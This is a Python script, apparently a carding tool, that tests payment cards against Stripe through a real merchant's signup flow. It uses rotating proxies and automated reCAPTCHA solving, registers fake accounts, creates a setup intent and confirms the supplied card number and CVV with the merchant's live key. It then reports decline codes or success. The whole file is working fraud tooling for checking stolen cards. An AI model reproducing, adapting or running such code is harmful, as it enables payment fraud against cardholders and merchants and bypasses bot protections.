import uuid,random,string
from proxy import proxies
import asyncio
from httpx import AsyncClient
from pypasser import reCaptchaV3
def generate_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com'])
    return f'{username}@{domain}'
def password():
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=16))


async def stripe_auth1(cc,mm,yy, cvv):

    email = generate_email()
    passw = password()
    proxy = proxies()
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxy) as r:
        token = reCaptchaV3("https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdLImoqAAAAAO2gVXhHNC404K8EMq2GSWyycSE2&co=aHR0cHM6Ly9hcHAuYmxhbmthYnJhbmQuY29tOjQ0Mw..&hl=en&v=-ZG7BC9TxCVEbzIO2m429usb&size=invisible")
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://app.blankabrand.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://app.blankabrand.com/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        json_data = {
            'first_name': 'Albedo',
            'last_name': 'Jones',
            'email': email,
            'password': passw,
            'recaptcha': token,
            'signup_source': 'organic',
            'signup_version': 'test_onboarding_b',
        }

        response = await r.post('https://api.blankabrand.com/api/users/register/', headers=headers, json=json_data)
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://app.blankabrand.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://app.blankabrand.com/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

        json_data = {
            'username': email,
            'password': passw,
        }
        try:
            response = await r.post('https://api.blankabrand.com/api/token/', headers=headers, json=json_data)
            bearer = response.json()['access']
        except:
            return 'Failed to authenticate'
        
        await asyncio.sleep(1)
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {bearer}',
            'cache-control': 'no-cache',
            'origin': 'https://app.blankabrand.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://app.blankabrand.com/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }
        try:
            response = await r.get('https://api.blankabrand.com/api/users/me/', headers=headers)
            id = response.json()['id']
        except:
            return 'Failed to get user ID'
        
        json_data = {
            'transaction_name': '/onboarding-step-1',
        }

        response = await r.post('https://api.blankabrand.com/api/trace/transaction/', headers=headers, json=json_data)
        json_data = {
            'onboarding_step': 2,
            'answerObject': {
                'id': 3,
                'answer': 'Influencer / creator',
                'otherAnswer': '',
                'has_other': False,
                'question': 'Which of the following best describes you?',
            },
        }

        response = await r.patch(f'https://api.blankabrand.com/api/shop/{id}/', headers=headers, json=json_data)
        json_data = {
            'amount': 888,
        }

        response = await r.post('https://api.blankabrand.com/api/payments/create-setup-intent/', headers=headers, json=json_data)
        try:
            client_secret = response.json()['client_secret']
            seti = client_secret.split("_secret_")[0]
        except:
            return 'Failed to create setup intent'
        await asyncio.sleep(1)
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }
        data = {
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][postal_code]": "10080",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/23733a2a86; stripe-js-v3/23733a2a86; payment-element",
            "payment_method_data[referrer]": "https://app.blankabrand.com",
            "payment_method_data[client_attribution_metadata][client_session_id]": "8a6aeb4e-30fd-48fe-888f-7fce296e271d",
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
            "payment_method_data[guid]": str(uuid.uuid4()),
            "payment_method_data[muid]": str(uuid.uuid4()),
            "payment_method_data[sid]": str(uuid.uuid4()),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51HKzs6EzjuN8pWiucWRuUcXFrhynojkbP5udoRvUTTZISWGIWI929ZWWSfKIIAUUI5CgbDthBpF4HRbwsG9cpy8o00Rdfp7Xg8",
            "client_secret": client_secret,
        }
        response = await r.post(
            f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
            headers=headers,
            data=data,
        )
        try:
            if response.status_code != 200:
                if 'error' in response.json():
                    if 'decline_code' in response.json()['error']:
                        msg = response.json()['error']['decline_code'].replace('_', ' ').title()
                        return msg
                    else:
                        msg = response.json()['error']['message']
                        return msg
                elif 'success' in response.json():
                    return 'Subcription created successfully'
            elif response.status_code == 200:
                return 'Subcription created successfully'
            else:
                return 'Unknown error'
        except:
            return 'Failed to confirm payment'

